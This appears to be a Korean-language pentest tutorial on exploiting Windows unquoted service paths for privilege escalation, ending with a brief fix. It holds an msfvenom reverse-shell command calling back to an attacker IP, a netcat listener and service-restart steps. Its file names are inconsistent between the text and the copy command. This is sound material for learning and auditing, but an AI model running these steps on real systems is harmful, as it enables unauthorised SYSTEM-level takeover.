


# 취약한 서비스 경로 (Unquoted Service Path) 공격 가이드

Unquoted Service Path는 Windows 서비스의 실행 파일 경로가 큰따옴표("")로 묶여 있지 않아 발생하는 고전적인 권한 상승 취약점입니다. 서비스가 높은 권한(예: `NT AUTHORITY\SYSTEM`)으로 실행될 경우, 이 취약점을 통해 시스템을 장악할 수 있습니다.

### **취약점 원리**

만약 서비스의 실행 경로가 `C:\Program Files\Some Service\service.exe`와 같이 공백을 포함하고 따옴표로 묶여있지 않다면, Windows는 이 경로를 순차적으로 해석하려 시도합니다.

1.  `C:\Program.exe`를 실행 시도
2.  (실패 시) `C:\Program Files\Some.exe`를 실행 시도
3.  (실패 시) `C:\Program Files\Some Service\service.exe`를 실행 시도

만약 공격자가 `C:\` 경로에 `Program.exe`라는 이름의 악성 파일을 업로드할 수 있다면, 서비스가 시작될 때 Windows는 원래의 `service.exe` 대신 공격자의 악성 파일을 `SYSTEM` 권한으로 실행하게 됩니다.

---

### **1. 취약점 식별**

- **목표:** 따옴표로 묶여있지 않고, 경로에 공백이 포함된 서비스를 찾습니다.

```powershell title="취약한 서비스 검색"
. .\PowerView.ps1;Invoke-AllChecks
winPEASany.exe

# C:\Windows\ 경로를 제외하고, 경로에 따옴표(")가 없는 서비스를 검색
wmic service get name,pathname,displayname,startmode | findstr /i /v "C:\Windows\" | findstr /i /v """
```

> `winPEAS`나 `PowerUp.ps1` 같은 자동화된 스크립트도 이 취약점을 자동으로 찾아줍니다.

---

### **2. 권한 확인**

- **목표:** 식별된 취약한 경로의 상위 폴더에 현재 사용자가 쓰기 권한을 가지고 있는지 확인합니다.

```powershell title="권한 확인"
sc.exe qc unquotedsvc

# 예: C:\Program Files\Unquoted Path Service\ 경로의 권한 확인
icacls "C:\Program Files\Unquoted Path Service"

# Sysinternals 도구인 accesschk 사용
.\accesschk64.exe /accepteula -uwqd "C:\Program Files\Unquoted Path Service\"

# 서비스 start/stop 권한 있는지 확인
sc.exe start unquotedsvc
sc.exe stop unquotedsvc
```

- **확인 사항:** `Everyone`, `Authenticated Users`, 또는 현재 사용자 그룹(`Users`)에 `(F)`(모든 권한) 또는 `(M)`(수정) 권한이 있는지 확인합니다. 또한, `sc qc <servicename>` 명령어로 해당 서비스를 제어할 권한이 있는지도 확인합니다.

--- 

### **3. 익스플로잇 (Exploitation)**

1.  **리버스 셸 페이로드 생성:**
    - `msfvenom`을 사용하여 `exe` 형식의 리버스 셸 페이로드를 생성합니다. 파일 이름은 Windows가 먼저 실행을 시도할 이름(예: `Program.exe`)으로 지정합니다.
    ```bash title="공격자: msfvenom 페이로드 생성"
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f exe -o Program.exe
```

2.  **페이로드 업로드:**
    - 생성된 `Program.exe`를 쓰기 권한이 있는 경로(예: `C:\`)에 업로드합니다.
    - 다음으로, 실행 파일을 따옴표로 묶지 않은 경로의 쓰기 가능한 폴더에 넣으세요. Windows는 따옴표로 묶지 않은 컨텍스트에서 데이터 구문 분석을 처리하는 방식 때문에 원래 실행 파일보다 먼저 실행 파일을 읽습니다.
    ```bash title="페이로드 업로드"
copy "C:\users\user\jaja\reverse.exe" "C:\Program Files\Unquoted Path Service\Common.exe"
```

3.  **리스너 실행:**
    - 공격자 머신에서 Netcat 리스너를 실행하여 연결을 기다립니다.
    ```bash title="공격자: Netcat 리스너"
rlwrap nc -lvnp 443
```

4.  **서비스 재시작:**
    - 타겟 시스템에서 서비스를 재시작하여 악성 페이로드가 실행되도록 합니다.
    ```powershell title="타겟: 서비스 재시작"
sc.exe query unquotedsvc
sc stop <servicename>
sc start <servicename>
```

5.  **권한 상승 성공:**
    - 서비스가 시작되면서 `Program.exe`가 `SYSTEM` 권한으로 실행되고, 공격자의 리스너에 `NT AUTHORITY\SYSTEM` 셸이 연결됩니다.

--- 

### **4. 방어 (Mitigation)**

- **해결책:** 모든 서비스의 실행 파일 경로를 **반드시 큰따옴표("")로 묶어주어야 합니다.**
  ```powershell
  sc config "<servicename>" binpath= "\"C:\Program Files\Some Service\service.exe\""
  ```
